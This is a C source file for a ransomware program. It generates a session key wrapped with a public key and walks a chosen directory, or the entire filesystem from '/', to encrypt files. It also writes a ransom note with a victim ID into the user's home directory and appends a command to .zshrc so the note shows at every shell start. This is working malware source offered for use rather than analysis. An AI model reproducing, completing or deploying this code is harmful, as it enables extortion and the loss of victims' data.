#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "utils.h"
#include "encrypt.h"
#include "decrypt.h"
#include "note.h"

unsigned char *sessionKey = NULL;
unsigned int decryptFlag = 0;
unsigned char *privateKeyPEM = NULL;

int Initial()
{
    // Session key for symmetric encryption
    sessionKey = malloc(32);
    if (sessionKey == NULL)
    {
        perror("Failed to allocate memory for key");
        return 1;
    }

    if (generateSessionKey(sessionKey, 32) != 0)
    {
        free(sessionKey);
        return 1;
    }

    // public key for asymmetric encryption to encrypt the session key
    EVP_PKEY *publicKey = getPublicKey();
    if (publicKey == NULL)
    {
        free(sessionKey);
        return 1;
    }

    // Wrap (encrypt) the session key with the public key
    size_t wrappedKeyLen;
    unsigned char *wrappedKey = wrapSessionKey(publicKey, sessionKey, 32, &wrappedKeyLen);
    if (wrappedKey == NULL)
    {
        EVP_PKEY_free(publicKey);
        free(sessionKey);
        return 1;
    }

    // store the wrapped key for reference during decryption
    storeWrappedBlob(wrappedKey, wrappedKeyLen);

    return 0;
}

int main(int argc, char *argv[])
{

    int opt;
    char *filePath = NULL;
    int encryptFlag = 0;
    int systemFlag = 0;

    while ((opt = getopt(argc, argv, "f:p:eds")) != -1)
    {
        switch (opt)
        {
        case 'p':
            privateKeyPEM = (unsigned char *)optarg;
            break;
        case 'f':
            filePath = optarg;
            break;
        case 'e':
            encryptFlag = 1;
            break;
        case 'd':
            decryptFlag = 1;
            break;
        case 's':
            systemFlag = 1;
            break;
        default:
            fprintf(stderr, "Usage: %s [-e (encrypt)] [-d (decrypt)] [-f filepath] [-p privatekeypath] [-s (system wide)]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    if (encryptFlag && decryptFlag)
    {
        fprintf(stderr, "Error: conflicting options specified!\n");
        exit(EXIT_FAILURE);
    }

    if (encryptFlag && filePath)
    {
        if (Initial())
        {
            return EXIT_FAILURE;
        }
        loopDir(filePath);
    }
    else if (encryptFlag && !filePath && systemFlag)
    {
        if (Initial())
        {
            return EXIT_FAILURE;
        }
        filePath = "/";
        loopDir(filePath);
    }
    else if (decryptFlag && filePath)
    {
        loopDir(filePath);
    }
    else if (decryptFlag && !filePath && systemFlag)
    {
        filePath = "/";
        loopDir(filePath);
    }

    // Create ransom note in home directory
    char *victimID = generateVictimID();
    struct passwd *pw = getpwuid(getuid());
    char *homeDir = pw->pw_dir;

    strcat(homeDir, "/README.txt");
    if (access(homeDir, F_OK) != 0)
    {
        createRansomNote(homeDir, victimID);
    }

    char command[1024];
    snprintf(command, sizeof(command), "bash -c 'echo \"cat %s\" >> /home/%s/.zshrc'", homeDir, pw->pw_name);
    system(command);

    return 0;
}